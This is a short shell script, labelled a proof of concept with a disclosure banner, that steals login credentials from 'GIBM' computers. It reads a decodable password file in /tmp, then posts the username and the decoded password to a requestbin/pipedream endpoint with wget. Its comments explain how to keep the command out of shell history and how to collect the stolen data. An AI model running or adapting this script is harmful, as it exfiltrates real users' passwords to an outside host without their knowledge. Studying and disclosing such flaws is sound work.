###-------------------------------------------------------------------------------------------------------------------------###
### DISCLAIMER: THIS IS A POC DEMONSTRATING WHY YOU SHOULD NOT USE ANY IMPORTANT CREDENTIALS TO LOG INTO YOUR GIBM COMPUTER ###
###          DEVELOPERS ASSUME NO LIABILITY FOR ANY DAMAGE OR ACTION THE USER CAUSES BY RUNNING THIS SCRIPT                 ###
###                                  YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS!                                              ###
###                                                                                                                         ###
###        RESPONSIBLE DISCLOSURE: THIS VULNERABILITY HAS BEEN REPORTED TO THE GIBMIT PRINCIPAL ON 06/02/2017               ###
###                                           NO FIX PROVIDED YET                                                           ###
###-------------------------------------------------------------------------------------------------------------------------###

# Make runable (chmod +x pw_grabber_poc.sh)
# Run with [space] ./pw_grabber_poc.sh (space before cmd doesn't save to history)

# Create a bin here: https://requestbin.com/ 
# Change REQUESTBIN variable to your generated endpoint
REQUESTBIN=https://en56wzg1et3b6.x.pipedream.net 

wget -O- --post-data $(whoami) $REQUESTBIN > /dev/null 2>&1
wget -O- --post-data $(cat /tmp/password-store-$USER | base64 -d) $REQUESTBIN > /dev/null 2>&1

# Now you can access the exfiltrated data over your requestbin instance